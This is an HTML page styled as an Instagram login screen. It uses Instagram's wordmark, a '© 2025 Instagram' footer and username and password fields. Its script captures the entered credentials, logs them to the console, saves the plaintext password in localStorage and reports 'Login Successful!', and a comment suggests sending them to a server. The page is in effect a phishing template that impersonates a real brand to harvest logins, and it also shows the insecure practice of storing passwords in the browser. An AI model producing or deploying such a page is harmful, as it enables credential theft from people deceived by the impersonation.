<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 175px;
        }

        .input-group {
            margin-bottom: 15px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
        }

        .input-group button {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 12px;
            color: #0095f6;
            cursor: pointer;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .submit-btn:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .divider::before {
            margin-right: 10px;
        }

        .divider::after {
            margin-left: 10px;
        }

        .divider span {
            font-size: 12px;
            color: #8e8e8e;
        }

        .error-message {
            color: red;
            font-size: 12px;
            margin-top: 10px;
        }

        .success-message {
            color: green;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
        </div>
        <form onsubmit="return validateForm(event)">
            <div class="input-group">
                <input type="text" id="username" placeholder="Username" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required minlength="6">
                <button type="button" onclick="togglePasswordVisibility()">Show</button>
            </div>
            <div class="error-message" id="password-error"></div>
            <button type="submit" class="submit-btn">Log In</button>
        </form>
        <div class="divider"><span>OR</span></div>
        <p style="color: #385185; font-size: 14px; margin: 0;">Â© 2025 Instagram </p>
        <div class="success-message" id="success-message"></div>
    </div>

    <script>
        function togglePasswordVisibility() {
            const passwordField = document.getElementById('password');
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
            } else {
                passwordField.type = 'password';
            }
        }

        function validateForm(event) {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('password-error');
            const successMessage = document.getElementById('success-message');

            // Reset error message and success message
            errorMessage.textContent = '';
            successMessage.textContent = '';

            // Check for minimum length
            if (password.length < 6) {
                errorMessage.textContent = 'Password must be at least 6 characters long.';
                event.preventDefault(); // Prevent form submission
                return false;
            }

            // Simulating saving and sending username/password (this would be replaced with server-side code in a real application)
            saveCredentials(username, password);
            
            // Show success message
            successMessage.textContent = 'Login Successful!';
            
            // Prevent form submission for demonstration purposes
            event.preventDefault();
            return false;
        }

        function saveCredentials(username, password) {
            // Here you would save/send the username and password, e.g., send to server via AJAX.
            console.log('Credentials Saved:', { username, password });

            // Simulating saving credentials locally for this example:
            localStorage.setItem('username', username);
            localStorage.setItem('password', password);
        }
    </script>
</body>
</html>
